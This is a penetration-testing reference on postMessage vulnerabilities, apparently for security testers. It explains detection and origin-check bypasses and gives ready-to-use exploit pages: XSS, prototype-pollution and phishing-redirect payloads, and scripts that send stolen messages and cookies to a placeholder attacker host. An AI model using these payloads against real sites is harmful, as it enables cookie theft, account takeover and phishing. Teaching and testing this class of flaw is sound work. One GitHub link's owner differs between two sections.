# PostMessage Vulnerabilities

> **Summary**: `window.postMessage` enables cross-origin communication between windows/iframes. When message handlers lack proper origin validation or sanitize message data insufficiently, attackers can send crafted messages to trigger DOM XSS, data theft, or unauthorized actions.
> **Impact**: DOM-based XSS, authentication bypass, sensitive data leakage, prototype pollution, unauthorized state changes.
> **Typical Severity**: Medium to High

## Detection

### Indicators
- JavaScript code using `window.addEventListener("message", ...)` or `$(window).on("message", ...)`
- `postMessage()` calls with wildcard (`*`) as `targetOrigin`
- Message handlers that process data without origin checks
- Iframed pages receiving configuration or sensitive data via postMessage

### Automated Detection
- Use browser DevTools: Elements > Event Listeners > look for "message" listeners
- Run in console: `getEventListeners(window)` to list all event listeners
- Browser extensions: [Posta](https://github.com/benso-io/posta), [postMessage-tracker](https://github.com/fransr/postMessage-tracker)
- Burp Suite DOM Invader: Automatically detects postMessage sinks

### Manual Detection
1. Search JavaScript source for `addEventListener("message"` and `onmessage`:
   ```bash
   grep -rn 'addEventListener.*message\|onmessage\|postMessage' <JS_FILES>
   ```
2. Check if handlers validate `event.origin` before processing
3. Check if `postMessage()` calls use specific origins or wildcard `*`
4. Look for `innerHTML`, `eval`, `document.write`, or `location` assignments in handlers

## Exploitation

### Prerequisites
- A page with a postMessage event listener that processes incoming messages
- Missing or bypassable origin validation in the handler
- Message data used in a security-sensitive operation (DOM manipulation, navigation, auth)

### Step-by-Step

1. **Find postMessage listeners**: Search the target's JavaScript for message event handlers:
   ```javascript
   // In browser console on target page
   getEventListeners(window).message
   ```
   **Success**: One or more message handlers identified.

2. **Analyze the handler code**: Check what the handler does with `event.data`:
   - Does it check `event.origin`?
   - Does it use the data in `innerHTML`, `eval`, `location.href`, `document.write`?
   - Does it pass data to a framework method (e.g., `$.html()`, `v-html`)?

   **Success**: Identified a sink where attacker-controlled data reaches without validation.

3. **Check origin validation**: Look for bypass opportunities:
   ```javascript
   // Weak: uses indexOf (bypassable)
   if (event.origin.indexOf("trusted.com") !== -1) { ... }

   // Weak: uses regex dot as wildcard
   if (event.origin.search("trusted.com") !== -1) { ... }

   // Missing: no origin check at all
   window.addEventListener("message", (e) => {
       document.getElementById("output").innerHTML = e.data;
   });
   ```

4. **Craft exploit page**: Host an attacker page that opens or iframes the target and sends a malicious message:
   ```html
   <iframe id="target" src="https://vulnerable.com/page"></iframe>
   <script>
   setTimeout(function() {
       document.getElementById("target").contentWindow.postMessage(
           '<img src=x onerror=alert(document.domain)>',
           '*'
       );
   }, 2000);
   </script>
   ```
   **Success**: JavaScript executes in the context of the vulnerable page.

5. **Steal sensitive data** if the target sends postMessages with wildcard origin:
   ```html
   <iframe id="target" src="https://vulnerable.com/page-that-sends-secrets"></iframe>
   <script>
   window.addEventListener("message", function(e) {
       fetch("https://<ATTACKER>/steal?data=" + encodeURIComponent(e.data));
   });
   </script>
   ```
   **Success**: Sensitive data from the target page exfiltrated to attacker server.

### Payloads

#### DOM XSS via postMessage (innerHTML sink)
```html
<iframe src="https://vulnerable.com" onload="
  this.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>','*')
">
</iframe>
```

#### DOM XSS via postMessage (eval sink)
```html
<iframe src="https://vulnerable.com" onload="
  this.contentWindow.postMessage('alert(document.domain)','*')
">
</iframe>
```

#### Prototype Pollution via postMessage
```html
<script>
var win = window.open('https://vulnerable.com', '_blank');
setTimeout(function() {
    win.postMessage('{"__proto__":{"isAdmin":true}}', '*');
}, 3000);
</script>
```

#### Location Redirect via postMessage
```html
<iframe src="https://vulnerable.com" onload="
  this.contentWindow.postMessage({type:'redirect',url:'https://attacker.com/phishing'},'*')
">
</iframe>
```

#### Stealing postMessage Data (Wildcard Origin Leak)
```html
<!-- If target sends sensitive data via postMessage with targetOrigin='*' -->
<iframe src="https://vulnerable.com/page-with-secrets"></iframe>
<script>
window.addEventListener("message", function(event) {
    // Exfiltrate whatever the iframe sends
    navigator.sendBeacon("https://<ATTACKER>/log", JSON.stringify({
        origin: event.origin,
        data: event.data
    }));
});
</script>
```

#### Stealing postMessage by Modifying iframe Location
```html
<!-- Target iframes a page and sends it secrets via postMessage -->
<iframe src="https://vulnerable.com/page-with-iframe" id="outer"></iframe>
<script>
// Change the inner iframe's location to our page to intercept the message
setInterval(function() {
    try {
        window.frames[0].frames[0].location = "https://<ATTACKER>/receiver.html";
    } catch(e) {}
}, 100);
</script>
```

### Proof of Concept

```html
<!DOCTYPE html>
<html>
<head><title>PostMessage PoC</title></head>
<body>
<h3>PostMessage Exploit</h3>
<iframe id="victim" src="https://<TARGET>/vulnerable-page" style="width:600px;height:400px;"></iframe>
<script>
var iframe = document.getElementById('victim');
iframe.onload = function() {
    // Send malicious postMessage after page loads
    iframe.contentWindow.postMessage(
        '<img src=x onerror="fetch(\'https://<ATTACKER>/cookie?\'+document.cookie)">',
        '*'
    );
};
</script>
</body>
</html>
```

## Bypasses

### Origin Validation Bypasses

- **`indexOf()` bypass**: If check is `event.origin.indexOf("example.com")`, register `example.com.attacker.com`
- **`search()` bypass**: `search("www.s.fedomain.com")` matches `www.safedomain.com` because `.` is regex wildcard
- **`match()` bypass**: Similar to `search()` -- improperly constructed regex allows bypass
- **Subdomain matching**: If check is `event.origin.endsWith(".example.com")`, use `evil.example.com` if you control a subdomain
- **Null origin**: Some handlers accept `null` origin from sandboxed iframes:
  ```html
  <iframe sandbox="allow-scripts" srcdoc="<script>parent.postMessage('payload','*')</script>"></iframe>
  ```

### Timing / Race Condition
- Use `setTimeout` with precise delays to send messages before the legitimate sender
- Block the main page with a heavy computation to intercept messages first

## Escalation

- **DOM XSS to session hijacking**: Steal cookies or tokens via the injected script
- **Prototype pollution to privilege escalation**: Modify application state objects
- **Data leakage to account takeover**: Steal authentication tokens sent via postMessage
- **Chain with clickjacking**: Trick user into interacting with an iframed page that triggers postMessage

## Tools

| Tool | Usage |
|------|-------|
| Burp DOM Invader | Browser extension for automated DOM vulnerability detection including postMessage |
| PMForce | [GitHub](https://github.com/nicornk/PMForce) -- Automated postMessage exploitation framework |
| Posta | [GitHub](https://github.com/benso-io/posta) -- Browser extension to intercept and replay postMessages |
| postMessage-tracker | [GitHub](https://github.com/nicornk/postMessage-tracker) -- Monitor all postMessage communications |
| Browser DevTools | Console: `getEventListeners(window)` / Elements > Event Listeners |

## References

- [PortSwigger - DOM-based postMessage Vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)
- [HackTricks - PostMessage Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities)
- [Google VRP - Hijacking Screenshots via postMessage](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)

## Cross-References

- [XSS](xss.md) -- DOM XSS via postMessage handlers
- [Clickjacking](clickjacking.md) -- Framing pages to trigger postMessage interactions
- [CSTI](csti.md) -- Client-side template injection via postMessage data
